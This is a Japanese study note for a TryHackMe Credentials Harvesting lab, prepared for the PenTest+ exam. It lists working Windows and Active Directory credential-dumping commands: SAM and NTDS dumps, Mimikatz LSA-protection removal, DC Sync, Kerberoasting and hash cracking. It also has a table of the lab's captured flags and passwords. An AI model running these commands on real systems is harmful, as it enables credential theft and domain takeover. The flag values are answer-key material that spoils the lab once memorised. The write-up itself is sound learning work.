# Credentials Harvesting

## 概要
WindowsシステムおよびActive Directory環境から認証情報を収集する技術を学ぶルーム。
内部ネットワークに侵入後、様々な場所から認証情報を取得する手法を実践形式で学習。

- **カテゴリ**: CompTIA Pentest+ / Attacks and Exploits
- **難易度**: 中級
- **完了日**: 2026年4月9日

---

## 学んだ技術・攻撃手法

### 1. Credential Access（Task 3）
認証情報が保存される場所：
- **Clear-text files**: コマンド履歴、設定ファイル、レジストリ
- **Database files**: McAfee等のアプリケーションDB
- **Memory**: LSASSプロセス
- **Password managers**: Windows Credential Manager
- **Active Directory**: ユーザーのDescription属性、SYSVOL、NTDS
- **Network Sniffing**: NTLMハッシュのキャプチャ

### 2. Local Windows Credentials（Task 4）
- **SAMデータベース**: ローカルアカウントのNTLMハッシュを格納
- **Volume Shadow Copy**: SAMファイルをコピーして取得
- **Registry Hives**: reg saveコマンドでSAM/SYSTEMをエクスポート
- **secretsdump**: Impacketツールでオフライン解析

### 3. LSASS（Task 5）
- **LSASSプロセス**: パスワード、ハッシュ、Kerberosチケットを保存
- **GUI**: タスクマネージャーでダンプファイル作成
- **ProcDump**: SysinternalsSuiteを使用
- **Mimikatz**: sekurlsa::logonpasswordsでメモリダンプ
- **LSA Protection**: RunAsPPL=1で保護、mimidrv.sysで無効化可能

### 4. Windows Credential Manager（Task 6）
- **vaultcmd**: Vaultの列挙
- **Get-WebCredentials.ps1**: Web認証情報の平文取得
- **cmdkey**: Windows認証情報の列挙
- **runas /savecred**: 保存済み認証情報で別ユーザーとして実行
- **Mimikatz sekurlsa::credman**: メモリから認証情報取得

### 5. Domain Controller（Task 7）
- **ntdsutil**: NTDS.ditのローカルダンプ
- **DC Sync**: secretsdumpでリモートダンプ
- **hashcat**: NTLMハッシュのクラック（-m 1000）

### 6. LAPS（Task 8）
- **AdmPwd.dll**: LAPSがインストールされているか確認
- **Find-AdmPwdExtendedRights**: LAPSパスワード読取り権限を持つグループ確認
- **Get-AdmPwdPassword**: LAPSパスワードの取得

### 7. Other Attacks（Task 9）
- **Kerberoasting**: SPN Account のTGSチケットを取得してオフラインクラック
- **AS-REP Roasting**: 事前認証不要アカウントのハッシュを取得
- **SMB Relay**: NTLMチャレンジレスポンスをMITMで取得
- **LLMNR/NBNS Poisoning**: 名前解決の偽装でNTLMハッシュを取得

---

## 使用したコマンド

### レジストリからパスワード検索
```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### ADのDescription確認
```powershell
Get-ADUser -Filter * -Properties Description | Select-Object Name, Description
```

### SAMダンプ（Volume Shadow Copy）
```cmd
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\Users\Administrator\Desktop\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Users\Administrator\Desktop\
```

### SAMダンプ（Registry）
```cmd
reg save HKLM\sam C:\Users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\Users\Administrator\Desktop\system-reg
```

### secretsdumpでローカル解析
```bash
impacket-secretsdump -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
```

### LSA Protection確認・無効化（Mimikatz）
```
# 保護確認
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL

# Mimikatzで無効化（C:\Tools\Mimikatz\から実行）
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords
```

### Windows Credential Manager
```cmd
# Vault列挙
vaultcmd /list
vaultcmd /listproperties:"Web Credentials"
vaultcmd /listcreds:"Web Credentials"

# Web認証情報取得（PowerShell）
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials

# Windows認証情報列挙
cmdkey /list

# 保存済み認証情報で実行
runas /savecred /user:THM.red\thm-local cmd.exe
```

### Mimikatz - Credential Manager
```
mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```

### NTDS.ditダンプ（ntdsutil）
```cmd
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

### secretsdumpでNTDS解析
```bash
impacket-secretsdump -security /tmp/SECURITY -system /tmp/SYSTEM -ntds /tmp/ntds.dit LOCAL
```

### DC Sync（secretsdump）
```bash
impacket-secretsdump -just-dc THM.red/<AD_Admin_User>@<IP>
impacket-secretsdump -just-dc-ntlm THM.red/<AD_Admin_User>@<IP>
```

### LAPS
```powershell
# LAPSインストール確認
dir "C:\Program Files\LAPS\CSE"

# 利用可能なコマンド確認
Get-Command *AdmPwd*

# Extended Rights確認
Find-AdmPwdExtendedRights -Identity THMorg

# LAPSパスワード取得
Get-AdmPwdPassword -ComputerName creds-harvestin
```

### Kerberoasting
```bash
# SPN列挙
impacket-GetUserSPNs -dc-ip <IP> THM.red/thm

# TGSチケット取得
impacket-GetUserSPNs -dc-ip <IP> THM.red/thm -request-user svc-thm -outputfile /tmp/spn.hash

# ハッシュクラック
hashcat -a 0 -m 13100 /tmp/spn.hash /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting
```bash
python3 /opt/impacket/examples/GetNPUsers.py -dc-ip <IP> thm.red/ -usersfile /tmp/users.txt
```

### hashcatでNTLMハッシュクラック
```bash
hashcat -m 1000 -a 0 <hash> /usr/share/wordlists/rockyou.txt
```

---

## 取得したフラグ・重要情報

| Task | 項目 | 値 |
|---|---|---|
| Task 3 | Registryフラグ | `7tyh4ckm3` |
| Task 3 | ADのDescriptionパスワード | `Passw0rd!@#` |
| Task 4 | Administrator NTLMハッシュ | `98d3a787a80d08385cea7fb4aa2a4261` |
| Task 6 | THMUser Webパスワード | `E4syPassw0rd` |
| Task 6 | SMB共有パスワード | `jfxKruLkkxoPjwe3` |
| Task 6 | flag.txt | `THM{RunA5S4veCr3ds}` |
| Task 7 | System bootKey | `0x36c8d26ec0df8b23ce63bcefa6e2d821` |
| Task 7 | bk-adminパスワード | `Passw0rd123` |
| Task 8 | LAPSパスワード | `THMLAPSPassw0rd` |
| Task 9 | svc-thmパスワード | `Passw0rd1` |

---

## PT0-003との関連

| 試験ドメイン | 関連技術 |
|---|---|
| Vulnerability Discovery | LSASS, SAM, NTDS, Registry |
| Attacks & Exploits | DC Sync, Kerberoasting, AS-REP Roasting |
| Post-Exploitation | Credential Dumping, Pass-the-Hash |

### 重要ポイント
- **SAMファイル**はOS起動中はロックされているためVSSまたはレジストリ経由で取得
- **LSA Protection**（RunAsPPL=1）はmimidrv.sysドライバで無効化可能
- **ADのDescription**に平文パスワードを残す管理者が多い（よくある設定ミス）
- **LAPS**パスワードはExtendedRights権限を持つグループのみ読取り可能
- **Kerberoasting**はSPNアカウントのパスワードが弱い場合に有効
- **credman**セクションに平文パスワードが残ることがある

---

## 参考リンク
- [TryHackMe - Credentials Harvesting](https://tryhackme.com/room/credharvesting)
- [Impacket](https://github.com/fortra/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [MITRE ATT&CK - Credential Access (TA0006)](https://attack.mitre.org/tactics/TA0006/)
